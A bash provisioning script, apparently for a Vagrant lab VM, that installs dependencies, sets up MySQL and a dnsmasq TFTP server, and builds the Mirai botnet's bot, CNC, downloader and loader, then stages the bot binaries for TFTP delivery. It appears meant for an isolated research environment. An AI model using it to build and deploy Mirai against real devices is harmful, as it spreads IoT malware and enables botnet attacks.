#!/usr/bin/env bash

echo ">>> Installing packages..."
export DEBIAN_FRONTEND=noninteractive
if [ "$[$(date +%s) - $(stat -c %Z /var/cache/apt/pkgcache.bin)]" -ge 600 ]; then
  apt-get update
fi
# apt-get install -y git gcc golang electric-fence mysql-server mysql-client duende
apt-get update -y
apt-get install -y git
apt-get install -y gcc
apt-get install -y electric-fence
apt-get install -y mysql-server
apt-get install -y mysql-client
apt-get install -y duende
# wget https://go.dev/dl/go1.19.2.linux-amd64.tar.gz
wget https://golang.org/dl/go1.16.3.linux-amd64.tar.gz
# tar -C /usr/local -xzf go1.19.2.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.16.3.linux-amd64.tar.gz
mkdir -p /etc/maradns/logger/

# Mirai fork is included, no need to checkout
#
#if [ ! -d /vagrant/mirai ]; then
#  echo ">>> Cloning mirai repository..."
#  git clone https://github.com/James-Gallagher/Mirai.git /vagrant/mirai
#fi

# if [ ! -d /etc/xcompile ]; then
#   echo ">>> Installing crosscompilers..."
#   mkdir /etc/xcompile
#   cd /etc/xcompile
 
#   COMPILERS="cross-compiler-armv4l cross-compiler-i586 cross-compiler-m68k cross-compiler-mips cross-compiler-mipsel cross-compiler-powerpc cross-compiler-sh4 cross-compiler-sparc"

#   for compiler in $COMPILERS; do        
#     wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/${compiler}.tar.bz2 --no-check-certificate
#     if [ -f "${compiler}.tar.bz2" ]; then
#       tar -jxf ${compiler}.tar.bz2
#       rm ${compiler}.tar.bz2
#       echo "export PATH=\$PATH:/etc/xcompile/$compiler/bin" >> ~/.mirairc
#       echo ">> Compiler $compiler installed"
#     else
#       echo "!> Can not download $compiler"
#     fi
#   done


# fi
  echo "export PATH=\$PATH:/usr/local/go/bin" >> ~/.mirairc
  echo "export GOPATH=\$HOME/go" >> ~/.mirairc
  echo "source ~/.mirairc" >> ~/.bashrc


echo ">>> Reloading mirairc..."
source ~/.mirairc

echo ">>> Configuring sql..."
mysql < /vagrant/configs/setup_sql.sql

echo ">>> Configuring dnsmasq..."
mkdir -p /vagrant/tftp
killall dnsmasq || true
cp /vagrant/configs/dnsmasq.conf /etc/dnsmasq.conf
dnsmasq

echo ">>> Building mirai bot and cnc..."
cd /vagrant/mirai/mirai/

echo ">>> Getting go requirements..." # The problem is the no required module provides package. Check this out: https://stackoverflow.com/questions/66894200/error-message-go-go-mod-file-not-found-in-current-directory-or-any-parent-dire
go mod init mirai-go
go get github.com/go-sql-driver/mysql # Esto hay que arreglarlo, mirar de instalar otra versión de go: https://www.cyberithub.com/how-to-install-latest-version-of-go-on-ubuntu-20-04/
go get github.com/mattn/go-shellwords # Esto hay que arreglarlo, mirar de instalar otra versión de go: https://www.cyberithub.com/how-to-install-latest-version-of-go-on-ubuntu-20-04/

./build.sh release telnet
cp /vagrant/mirai/mirai/release/mirai* /vagrant/tftp/

echo ">>> Building dlr..."
cd /vagrant/mirai/dlr
./build.sh
cp /vagrant/mirai/dlr/release/* /vagrant/mirai/loader/bins/

echo ">>> Building loader..."
cd /vagrant/mirai/loader
./build.sh

echo ">>> Building loader Debug..."
./build.debug.sh

echo ">>> Done"